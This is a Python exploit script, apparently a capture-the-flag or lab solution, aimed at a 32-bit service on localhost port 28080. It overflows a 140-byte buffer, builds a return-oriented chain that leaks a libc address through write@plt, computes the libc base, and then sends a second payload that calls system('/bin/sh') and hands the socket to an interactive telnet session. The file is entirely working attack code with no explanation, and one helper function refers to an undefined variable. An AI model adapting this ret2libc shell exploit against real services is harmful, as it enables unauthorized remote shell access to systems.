import struct
import sys
import socket
import time
import telnetlib


bufsize = 140
popret = 0x080482e9
write_plt = 0x08048320
gets_got = 0x0804a00c
pop3ret = 0x08048549
main_addr = 0x08048499
libc_start_main_got = 0x0804a010
libc_start_main_rel = 0x00018d90

system_rel = 0x0003cd10
binsh_rel = 0x0017b8cf






def dump_param():
    print("pop_ecx_pop_eax = 0x%x" % (pop_ecx_pop_eax))



def p(val):
    return struct.pack('<I', val)

def u(val):
    return struct.unpack('<I', val)[0]



def main():
    buf = b'A' * bufsize
    buf += p(write_plt)
    buf += p(pop3ret) 
    buf += p(1)
    buf += p(libc_start_main_got) 
    buf += p(4)
    buf += p(main_addr)
    buf += b'\n'
#    sys.stdout.buffer.write(buf)
#    sys.exit()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    print(sock.recv(7))
    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)

    print(sock.recv(9))
#    print(sock.recv(1))
    print("next round");
    time.sleep(1)

    val = sock.recv(4)
    print(len(val))
    libc_start_main_addr = u(val)
    print("%x" % (libc_start_main_addr))
    libc_base = libc_start_main_addr - libc_start_main_rel
    print("%x" % (libc_base))
    system_addr = libc_base + system_rel
    binsh_addr = libc_base + binsh_rel

    buf = b'A' * bufsize
    buf += p(system_addr)
    buf += b'A' * 4
    buf += p(binsh_addr)
    buf += b'\n'

    time.sleep(1)
    print(sock.recv(7))

    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)
    print(sock.recv(9))

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
